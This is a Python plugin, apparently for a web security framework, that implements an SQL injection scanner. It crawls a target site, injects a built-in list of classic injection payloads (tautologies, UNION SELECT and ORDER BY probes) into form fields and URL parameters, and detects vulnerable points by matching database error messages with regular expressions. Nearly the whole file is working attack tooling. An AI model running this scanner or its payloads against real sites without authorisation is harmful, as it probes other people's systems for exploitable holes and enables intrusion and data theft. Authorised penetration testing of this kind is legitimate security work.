import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin, urlparse
import logging
import concurrent.futures

logger = logging.getLogger(__name__)

class Plugin:
    def __init__(self, options):
        self.timeout = options.get('timeout', 30)
        self.max_depth = options.get('max_depth', 3)
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1--",
            "' UNION SELECT NULL, NULL--",
            "admin' --",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
        ]

    def run(self, data):
        url = data.get('url')
        if not url:
            logger.error("No URL provided for SQL injection scan")
            return {"error": "No URL provided"}

        logger.info(f"Starting SQL injection scan for {url}")
        results = []
        visited = set()
        self._scan_url(url, 0, visited, results)
        logger.info(f"SQL injection scan completed for {url}")
        return {"vulnerable_points": results}

    def _scan_url(self, url, depth, visited, results):
        if depth > self.max_depth or url in visited:
            return

        visited.add(url)
        logger.debug(f"Scanning URL: {url} (depth: {depth})")

        try:
            response = requests.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')

            with concurrent.futures.ThreadPoolExecutor() as executor:
                form_futures = [executor.submit(self._check_form, url, form) for form in soup.find_all('form')]
                param_future = executor.submit(self._check_get_params, url)

                for future in concurrent.futures.as_completed(form_futures):
                    result = future.result()
                    if result:
                        results.append(result)
                        logger.warning(f"Potential SQL injection vulnerability found in form: {result}")

                param_result = param_future.result()
                if param_result:
                    results.append(param_result)
                    logger.warning(f"Potential SQL injection vulnerability found in GET parameters: {param_result}")

            # Recursively scan linked pages
            if depth < self.max_depth:
                links = soup.find_all('a', href=True)
                with concurrent.futures.ThreadPoolExecutor() as executor:
                    executor.map(lambda link: self._scan_url(urljoin(url, link['href']), depth + 1, visited, results),
                                 [link for link in links if urljoin(url, link['href']).startswith(url)])

        except requests.RequestException as e:
            logger.error(f"Request failed for {url}: {str(e)}")
            results.append({"error": f"Request failed for {url}: {str(e)}"})

    def _check_form(self, url, form):
        action = urljoin(url, form.get('action', ''))
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')

        for input_field in inputs:
            if input_field.get('type') in ['text', 'password', 'hidden']:
                for payload in self.payloads:
                    data = {input_field['name']: payload}
                    try:
                        if method == 'post':
                            response = requests.post(action, data=data, timeout=self.timeout)
                        else:
                            response = requests.get(action, params=data, timeout=self.timeout)
                        
                        if self._check_sql_error(response.text):
                            return {
                                "url": url,
                                "form_action": action,
                                "form_method": method,
                                "vulnerable_input": input_field['name'],
                                "payload": payload,
                                "reason": "SQL error detected in response"
                            }
                    except requests.RequestException as e:
                        logger.error(f"Request failed for {action}: {str(e)}")
                        continue

        return None

    def _check_get_params(self, url):
        parsed_url = urlparse(url)
        params = parsed_url.query.split('&')
        
        for param in params:
            if '=' in param:
                param_name = param.split('=')[0]
                for payload in self.payloads:
                    test_url = url.replace(param, f"{param_name}={payload}")
                    try:
                        response = requests.get(test_url, timeout=self.timeout)
                        if self._check_sql_error(response.text):
                            return {
                                "url": url,
                                "vulnerable_param": param_name,
                                "payload": payload,
                                "reason": "SQL error detected in response"
                            }
                    except requests.RequestException as e:
                        logger.error(f"Request failed for {test_url}: {str(e)}")
                        continue

        return None

    def _check_sql_error(self, content):
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Driver.*SQL[\-\_\ ]*Server",
            r"OLE DB.*SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_.*",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
            r"(?s)Exception.*\WRoadhouse\.Cms\.",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"Warning.*ora_.*",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Microsoft Access Driver",
            r"JET Database Engine",
            r"Access Database Engine",
            r"ODBC Microsoft Access",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]",
            r"DB2 SQL error",
            r"db2_\w+\(",
            r"SQLSTATE[^\s]+",
            r"Warning.*sybase.*",
            r"Sybase message",
            r"Sybase.*Server message.*"
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False

    def get_info(self):
        return {
            "name": "SQL Injection Scanner",
            "description": "Scans for SQL injection vulnerabilities",
            "version": "1.0.0"
        }